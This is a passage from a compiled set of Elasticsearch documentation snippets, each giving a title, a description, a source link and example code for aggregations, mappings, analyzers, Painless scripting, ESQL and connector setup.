\"2015-09-30T06:00:00.000Z\" },\n          \"doc_count\": 1\n        },\n        {\n          \"key\": { \"date\": \"2015-10-01T06:00:00.000Z\" },\n          \"doc_count\": 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Date Histogram with Offset Example\nDESCRIPTION: Shows how to use the offset parameter with a date histogram to adjust bucket boundaries. This example creates documents and then uses a 6-hour offset to change buckets from midnight-to-midnight to 6am-to-6am.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-000001/_doc/1?refresh\n{\n  \"date\": \"2015-10-01T05:30:00Z\"\n}\n\nPUT my-index-000001/_doc/2?refresh\n{\n  \"date\": \"2015-10-01T06:30:00Z\"\n}\n\nGET my-index-000001/_search?size=0\n{\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\" : {\n        \"sources\" : [\n          {\n            \"date\": {\n              \"date_histogram\" : {\n                \"field\": \"date\",\n                \"calendar_interval\": \"day\",\n                \"offset\": \"+6h\",\n                \"format\": \"iso8601\"\n              }\n            }\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: String to Character Casting in Painless\nDESCRIPTION: Shows how to convert `String` literals and references into `char` type values in Painless using the cast operator.  It specifies the conditions under which the conversion will fail, such as if the string is not a single character in length or is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_8\n\nLANGUAGE: painless\nCODE:\n```\nchar c = (char)\"C\"; <1>\nc = (char)'c';      <2>\n```\n\nLANGUAGE: painless\nCODE:\n```\nString s = \"s\";   <1>\nchar c = (char)s; <2>\n```\n\n----------------------------------------\n\nTITLE: Default Bounds Representation in Synthetic Source\nDESCRIPTION: This example shows how default values for range bounds are represented as null in synthetic source, even when explicitly provided with default values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"my_range\": { \"type\": \"integer_range\" }\n    }\n  }\n}\n\nPUT idx/_doc/1\n{\n  \"my_range\": {\n    \"lte\": 2147483647\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"my_range\": {\n    \"gte\": null,\n    \"lte\": null\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Terminate Processor in Elasticsearch\nDESCRIPTION: Example of configuring a terminate processor that stops pipeline execution when an error field is present. The processor runs conditionally using the 'if' parameter to check for the existence of an error context variable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/terminate-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"description\" : \"terminates the current pipeline if the error field is present\",\n  \"terminate\": {\n    \"if\": \"ctx.error != null\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ICU Analyzer Parameters in Elasticsearch\nDESCRIPTION: Demonstrates the configuration parameters available for the icu_analyzer. The analyzer supports method parameter for normalization type (nfkc, nfc, nfkc_cf) and mode parameter for normalization mode (compose, decompose).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmethod: # Accepts nfkc, nfc or nfkc_cf (default)\nmode: # Accepts compose (default) or decompose\n```\n\n----------------------------------------\n\nTITLE: Unmapped Fields Handling in Elasticsearch Sort\nDESCRIPTION: Shows how to handle unmapped fields in sorting using the unmapped_type parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"sort\" : [\n    { \"price\" : {\"unmapped_type\" : \"long\"} }\n  ],\n  \"query\" : {\n    \"term\" : { \"product\" : \"chocolate\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Text to Uppercase with TO_UPPER Function in ESQL\nDESCRIPTION: This example demonstrates how to use the TO_UPPER function in ESQL to convert a text string to all uppercase letters. It creates a row with a message field and then uses EVAL with TO_UPPER to create a new field containing the uppercase version of the message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_upper.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"Some Text\"\n| EVAL message_upper = TO_UPPER(message)\n```\n\n----------------------------------------\n\nTITLE: Basic Pattern Capture Example - Regular Expression Pattern\nDESCRIPTION: Demonstrates a simple regular expression pattern that captures letter and number groups\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-capture-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n\"(([a-z]+)(\\d*))\"\n```\n\n----------------------------------------\n\nTITLE: Advanced Extraction Service Configuration in YAML\nDESCRIPTION: Extended YAML configuration for the self-hosted extraction service, including optional fields for timeout, file pointers usage, stream chunk size, and shared volume directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# data-extraction-service settings\nextraction_service:\n  host: http://localhost:8090\n  timeout: 30\n  use_file_pointers: false\n  stream_chunk_size: 65536\n  shared_volume_dir: '/app/files'\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using kuromoji_stemmer Token Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to configure an Elasticsearch index with a custom analyzer that uses the kuromoji_stemmer token filter to normalize katakana words. It includes creating an index with appropriate settings and testing the analyzer with sample katakana words to show how the stemming works with different word lengths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-stemmer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [\n              \"my_katakana_stemmer\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"my_katakana_stemmer\": {\n            \"type\": \"kuromoji_stemmer\",\n            \"minimum_length\": 4\n          }\n        }\n      }\n    }\n  }\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"コピー\" <1>\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"サーバー\" <2>\n}\n```\n\n----------------------------------------\n\nTITLE: Using SQL LIKE Pattern for Table Matching in Elasticsearch\nDESCRIPTION: Shows how to use SQL LIKE pattern to match tables starting with 'emp'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-index-patterns.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES LIKE 'emp%';\n```\n\n----------------------------------------\n\nTITLE: Adding IP Range Field to Mapping and Indexing with CIDR Notation\nDESCRIPTION: Example demonstrating how to add an ip_range field to an existing mapping and index a document using CIDR notation for the IP range. IP ranges can use both the standard range format and CIDR notation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT range_index/_mapping\n{\n  \"properties\": {\n    \"ip_allowlist\": {\n      \"type\": \"ip_range\"\n    }\n  }\n}\n\nPUT range_index/_doc/2\n{\n  \"ip_allowlist\" : \"192.168.0.0/16\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Indices with Custom Priority Settings\nDESCRIPTION: This snippet shows how to create multiple Elasticsearch indices with different priority settings. It demonstrates setting a custom index.priority for some indices while leaving others at default priority.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/recovery-prioritization.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT index_1\n\nPUT index_2\n\nPUT index_3\n{\n  \"settings\": {\n    \"index.priority\": 10\n  }\n}\n\nPUT index_4\n{\n  \"settings\": {\n    \"index.priority\": 5\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Custom SAML Metadata with Additional Options in Shell\nDESCRIPTION: This example shows how to generate a metadata file for the 'saml2' realm with custom service name, locale, contacts, and organization information using the elasticsearch-saml-metadata command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/saml-metadata.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-saml-metadata --realm saml2 \\\n    --service-name kibana-finance \\\n    --locale en-GB \\\n    --contacts \\\n    --organisation-name \"Mega Corp. Finance Team\" \\\n    --organisation-url \"http://mega.example.com/finance/\"\n```\n\n----------------------------------------\n\nTITLE: Using BigInteger in Elasticsearch Scripts for Unsigned Long\nDESCRIPTION: This snippet demonstrates how to treat an unsigned long field as BigInteger in Elasticsearch scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/unsigned-long.md#2025-04-22_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n\"script\": {\n    \"source\": \"field('my_counter').asBigInteger(BigInteger.ZERO)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Not Equals Operator in ESQL\nDESCRIPTION: The not equals (!=) operator checks if two fields have different values. When used with multivalued fields, the result is null. This comparison operator follows standard SQL inequality semantics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/layout/not_equals.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nfield1 != field2\n```\n\n----------------------------------------\n\nTITLE: Defining Parent-Child Relations with Join Field Type in Elasticsearch\nDESCRIPTION: Example of defining a join field that creates a parent/child relation where 'question' is the parent of 'answer'. This mapping creates a special field that allows documents to be linked within the same index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_id\": {\n        \"type\": \"keyword\"\n      },\n      \"my_join_field\": { <1>\n        \"type\": \"join\",\n        \"relations\": {\n          \"question\": \"answer\" <2>\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Whitespace Analyzer in Elasticsearch\nDESCRIPTION: This snippet illustrates how to create a custom analyzer based on the built-in `whitespace` analyzer in Elasticsearch. It sets up a new index with custom settings to modify the behavior of the existing analyzer, specifically by adding token filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-whitespace-analyzer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /whitespace_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"rebuilt_whitespace\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [         <1>\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Databases with Title Filter - JSON Snippet - JavaScript\nDESCRIPTION: This JSON snippet is used to filter and index every database in Notion where the title includes 'Demo Database'. This is crucial for creating sync rules related to database content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"searches\": [\n    {\n      \"filter\": {\n        \"value\": \"database\"\n      },\n      \"query\": \"Demo Database\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Standardizing FilePermission Creation\nDESCRIPTION: Forbids direct instantiation of FilePermission objects, requiring the use of FilePermissionUtils instead.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_18\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Avoid creating FilePermission objects directly, but use FilePermissionUtils instead\njava.io.FilePermission#<init>(java.lang.String,java.lang.String)\n```\n\n----------------------------------------\n\nTITLE: Including GREATEST Function Parameters in Markdown\nDESCRIPTION: This snippet includes the content of a separate Markdown file containing the parameters for the GREATEST function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/greatest.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/greatest.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Running SharePoint Server Connector E2E Tests\nDESCRIPTION: Commands for executing end-to-end functional tests for the SharePoint Server connector. Includes options for full testing and faster testing with reduced data size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint.md#2025-04-22_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=sharepoint_server\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=sharepoint_server DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Password Change Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Defines the structure of a password change object in security configuration change events. It includes the user's name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_24\n\nLANGUAGE: javascript\nCODE:\n```\n{\"user\":{\"name\": <string>}}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Span Term Query with Boost\nDESCRIPTION: This snippet demonstrates using a boost value with the `span_term` query.  It searches for spans where `user.id` is `kimchy`, but increases the score of matching documents by a factor of 2.0. The boost parameter allows to give more importance to specific terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-term-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_term\" : { \"user.id\" : { \"value\" : \"kimchy\", \"boost\" : 2.0 } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Document Routing with Collapse Field Value\nDESCRIPTION: Demonstrates how to assign the collapse field value as the routing key during indexing to ensure documents sharing the same collapse value are clustered on one shard for reliable ordering when rescoring.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/collapse-search-results.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_doc?routing=xyz      <1>\n{\n  \"@timestamp\": \"2099-11-15T13:12:00\",\n  \"message\": \"You know for search!\",\n  \"user.id\": \"xyz\"\n}\n```\n\n----------------------------------------\n\nTITLE: Running Redis Connector Docker Image\nDESCRIPTION: Docker command to run the Redis connector service image, mounting the configuration file and connecting to the Elastic network.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Searching Documents with Join Fields in Elasticsearch\nDESCRIPTION: Example of searching an index that contains documents with a join field. The search returns both parent and child documents, showing how the join field appears in each document type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"sort\": [\"my_id\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Including LEAST Function Supported Types in Markdown\nDESCRIPTION: This code snippet includes the supported types documentation for the LEAST function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/least.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/least.md\n:::\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Type Support Matrix\nDESCRIPTION: Defines the supported combinations of field types and timestamp formats for ESQL operations. Shows the mapping between unit types (keyword/text), start/end timestamp types (date/date_nanos), and their resulting integer output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/date_diff.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| unit | startTimestamp | endTimestamp | result |\n| --- | --- | --- | --- |\n| keyword | date | date | integer |\n| keyword | date | date_nanos | integer |\n| keyword | date_nanos | date | integer |\n| keyword | date_nanos | date_nanos | integer |\n| text | date | date | integer |\n| text | date | date_nanos | integer |\n| text | date_nanos | date | integer |\n| text | date_nanos | date_nanos | integer |\n```\n\n----------------------------------------\n\nTITLE: Updating MySQL Connector Configuration\nDESCRIPTION: Script to fix MySQL connector configuration when upgrading from tech preview versions (8.7 or earlier) to 8.8. This adds missing required fields to the configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mysql.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPOST /.elastic-connectors/_update/connector_id\n{\n  \"doc\" : {\n    \"configuration\": {\n      \"tables\": {\n        \"type\": \"list\",\n        \"value\": \"*\"\n      },\n      \"ssl_enabled\": {\n        \"type\": \"bool\",\n        \"value\": false\n      },\n      \"ssl_ca\": {\n        \"type\": \"str\",\n        \"value\": \"\"\n      },\n      \"fetch_size\": {\n        \"type\": \"int\",\n        \"value\": 50\n      },\n      \"retry_count\": {\n        \"type\": \"int\",\n        \"value\": 3\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Incremental Cumulative Cardinality Query\nDESCRIPTION: Advanced example showing how to calculate both cumulative and incremental new user counts using combination of cumulative_cardinality and derivative aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-cumulative-cardinality-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /user_hits/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"users_per_day\": {\n      \"date_histogram\": {\n        \"field\": \"timestamp\",\n        \"calendar_interval\": \"day\"\n      },\n      \"aggs\": {\n        \"distinct_users\": {\n          \"cardinality\": {\n            \"field\": \"user_id\"\n          }\n        },\n        \"total_new_users\": {\n          \"cumulative_cardinality\": {\n            \"buckets_path\": \"distinct_users\"\n          }\n        },\n        \"incremental_new_users\": {\n          \"derivative\": {\n            \"buckets_path\": \"total_new_users\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Index and Indexing Geo-point Data in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with a geo_point field and index sample museum location data using the bulk API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohashgrid-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /museums\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n\nPOST /museums/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"location\": \"POINT (4.912350 52.374081)\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{\"_id\":2}}\n{\"location\": \"POINT (4.901618 52.369219)\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{\"_id\":3}}\n{\"location\": \"POINT (4.914722 52.371667)\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{\"_id\":4}}\n{\"location\": \"POINT (4.405200 51.222900)\", \"name\": \"Letterenhuis\"}\n{\"index\":{\"_id\":5}}\n{\"location\": \"POINT (2.336389 48.861111)\", \"name\": \"Musée du Louvre\"}\n{\"index\":{\"_id\":6}}\n{\"location\": \"POINT (2.327000 48.860000)\", \"name\": \"Musée d'Orsay\"}\n```\n\n----------------------------------------\n\nTITLE: Defining Max Similarity Dot Product Function\nDESCRIPTION: This snippet defines a function for calculating the maximum similarity using the dot product method within the score context. It binds the function to the specific utility class responsible for this calculation in Elasticsearch. The required parameters include a ScoreScript, an Object, and a String, which are used to perform the computation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/rank-vectors/src/main/resources/org/elasticsearch/xpack/rank/vectors/script/rank_vector_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\ndouble maxSimDotProduct(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.xpack.rank.vectors.script.RankVectorsScoreScriptUtils$MaxSimDotProduct\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon with Hole in GeoJSON Format\nDESCRIPTION: This example shows how to index a polygon with a hole in GeoJSON format. The polygon is defined with two coordinate arrays: the first represents the outer boundary, and the second represents the interior hole.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"polygon\",\n    \"coordinates\" : [\n      [ [1000.0, -1001.0], [1001.0, -1001.0], [1001.0, -1000.0], [1000.0, -1000.0], [1000.0, -1001.0] ],\n      [ [1000.2, -1001.2], [1000.8, -1001.2], [1000.8, -1001.8], [1000.2, -1001.8], [1000.2, -1001.2] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating vector field type to int4_hnsw in Elasticsearch\nDESCRIPTION: Updates an existing dense_vector field from 'flat' type to 'int4_hnsw' type using the mapping API. This change applies only to newly indexed vectors and allows for more efficient KNN queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_mapping\n{\n    \"properties\": {\n        \"text_embedding\": {\n            \"type\": \"dense_vector\",\n            \"dims\": 384,\n            \"index_options\": {\n                \"type\": \"int4_hnsw\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Percentiles Bucket Aggregation in JavaScript\nDESCRIPTION: Demonstrates the basic syntax for a percentiles_bucket aggregation in Elasticsearch. It specifies the buckets_path parameter to indicate which metric to calculate percentiles for.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-percentiles-bucket-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"percentiles_bucket\": {\n    \"buckets_path\": \"the_sum\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Box Connector Docker Image\nDESCRIPTION: Shell command to run the Docker image for the Box Connector Service. It mounts a local configuration directory, sets the network, and specifies the Docker image and command to execute.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-box.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Defining RuntimeException in Java\nDESCRIPTION: This snippet defines the java.lang.RuntimeException class, which is the superclass of those exceptions that can be thrown during the normal operation of the Java Virtual Machine. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_48\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.RuntimeException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Using Less Than Or Equal Operator with 'def' Type in Painless\nDESCRIPTION: Demonstrates the usage of the less than or equal operator with the 'def' type, showing implicit casting and type promotion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\nint x = 5;        <1>\ndef y = 7.0;      <2>\ndef z = y <= 7.0; <3>\ndef a = x <= y;   <4>\n```\n\n----------------------------------------\n\nTITLE: Applying Less Than Operator in Painless\nDESCRIPTION: Demonstrates the less than operator '<' with various numeric types and def type. Includes type promotion, implicit casting, and comparison results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\nboolean x = 5 < 4;\ndouble y = 6.0;\nx = 6 < y;\n```\n\nLANGUAGE: painless\nCODE:\n```\nint x = 5;\ndef y = 7.0;\ndef z = y < 6.5;\ndef a = x < y;\n```\n\n----------------------------------------\n\nTITLE: Whitespace Analyzer in Elasticsearch\nDESCRIPTION: Analyzer that splits text into terms on whitespace characters without lowercasing terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analyzer-reference.md#2025-04-21_snippet_2\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"analyzer\": \"whitespace\"\n```\n\n----------------------------------------\n\nTITLE: Modifying Elasticsearch Port on Running GCE Instance\nDESCRIPTION: This snippet shows how to add or modify the Elasticsearch port metadata for an existing Google Compute Engine instance. It uses the 'gcloud compute instances add-metadata' command to set the 'es_port' metadata value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-port.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\ngcloud compute instances add-metadata myesnode1 \\\n       --zone europe-west1-a \\\n       --metadata es_port=9301\n```\n\n----------------------------------------\n\nTITLE: Configuring Network Interface in Elasticsearch YAML\nDESCRIPTION: Uses the addresses of a specific network interface. This example uses the addresses of an interface called 'en0'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nnetwork.host: \"_en0_\"\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with CJK Width Filter\nDESCRIPTION: Example of using the CJK width token filter to analyze Japanese text. The filter normalizes half-width Katakana characters into their full-width equivalents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-cjk-width-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\" : \"standard\",\n  \"filter\" : [\"cjk_width\"],\n  \"text\" : \"ｼｰｻｲﾄﾞﾗｲﾅｰ\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\nシーサイドライナー\n```\n\n----------------------------------------\n\nTITLE: Minimum Document Count for Significant Terms in Elasticsearch\nDESCRIPTION: This example shows how to set a minimum document count for significant terms. The aggregation will only return terms that appear in at least 10 documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"tags\": {\n      \"significant_terms\": {\n        \"field\": \"tag\",\n        \"min_doc_count\": 10\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Json Utility Class for Elasticsearch Painless\nDESCRIPTION: This snippet defines a Json utility class for the Elasticsearch Painless scripting language. It provides methods for loading JSON from a string and dumping objects to JSON strings, with an option to control pretty-printing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/src/main/resources/org/elasticsearch/xpack/watcher/painless_whitelist.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.painless.api.Json {\n  def load(String)\n  String dump(def)\n  String dump(def, boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: Analyze API Request with word_delimiter\nDESCRIPTION: This example demonstrates how to use the `word_delimiter` filter with the Elasticsearch Analyze API to split a text string into normalized tokens using the filter's default rules. It specifies the `keyword` tokenizer and `word_delimiter` filter in the request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"keyword\",\n  \"filter\": [ \"word_delimiter\" ],\n  \"text\": \"Neil's-Super-Duper-XL500--42+AutoCoder\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Synonyms Using WordNet Format in Text\nDESCRIPTION: Demonstrates the format of defining synonyms with WordNet, which include a unique numeric identifier and additional attributes for each synonym. This setup is suitable for applications requiring detailed grammatical information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-graph-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: 